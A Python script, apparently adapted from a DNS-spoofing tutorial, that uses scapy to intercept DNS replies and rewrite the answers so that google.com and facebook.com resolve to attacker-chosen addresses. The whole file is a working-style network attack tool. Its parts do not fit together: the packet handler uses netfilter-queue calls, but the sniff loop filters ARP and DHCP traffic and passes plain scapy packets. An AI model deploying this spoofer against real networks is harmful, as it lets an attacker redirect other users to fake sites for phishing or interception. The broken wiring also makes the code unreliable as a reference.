#dns_spoofer.py
#https://www.thepythoncode.com/article/make-dns-spoof-python
# DNS mapping records, feel free to add/modify this dictionary

#http://archive.is/20140219062550/danmcinerney.org/reliable-dns-spoofing-with-python-scapy-nfqueue/
# for example, google.com will be redirected to 192.168.1.100
from scapy.all import *

dns_hosts = {
    b"www.google.com.": "192.168.1.100",
    b"google.com.": "192.168.1.100",
    b"facebook.com.": "172.217.19.142"
}

def process_packet(packet):
    #"""
    #Whenever a new packet is redirected to the netfilter queue,
    #this callback is called.
    #"""
    # convert netfilter queue packet to scapy packet
    scapy_packet = IP(packet.get_payload())
    if scapy_packet.haslayer(DNSRR):
        # if the packet is a DNS Resource Record (DNS reply)
        # modify the packet
        print("[Before]:", scapy_packet.summary())
        try:
            scapy_packet = modify_packet(scapy_packet)
        except IndexError:
            # not UDP packet, this can be IPerror/UDPerror packets
            pass
        print("[After ]:", scapy_packet.summary())
        # set back as netfilter queue packet
        packet.set_payload(bytes(scapy_packet))
    # accept the packet
    packet.accept()

def modify_packet(packet):
    
    #Modifies the DNS Resource Record `packet` ( the answer part)
    #to map our globally defined `dns_hosts` dictionary.
    #For instance, whenever we see a google.com answer, this function replaces 
    #the real IP address (172.217.19.142) with fake IP address (192.168.1.100)
    # get the DNS question name, the domain name
    qname = packet[DNSQR].qname
    if qname not in dns_hosts:
        # if the website isn't in our record
        # we don't wanna modify that
        print("no modification:", qname)
        return packet
    # craft new answer, overriding the original
    # setting the rdata for the IP we want to redirect (spoofed)
    # for instance, google.com will be mapped to "192.168.1.100"
    packet[DNS].an = DNSRR(rrname=qname, rdata=dns_hosts[qname])
    # set the answer count to 1
    packet[DNS].ancount = 1
    # delete checksums and length of packet, because we have modified the packet
    # new calculations are required ( scapy will do automatically )
    del packet[IP].len
    del packet[IP].chksum
    del packet[UDP].len
    del packet[UDP].chksum
    # return the modified packet
    return packet

def start():
    #may need to set count so it runs more often
    sniff(filter="arp or (udp and (port 67 or 68))", prn=process_packet, iface="Intel(R) Dual Band Wireless-AC 3165", store=0)

start()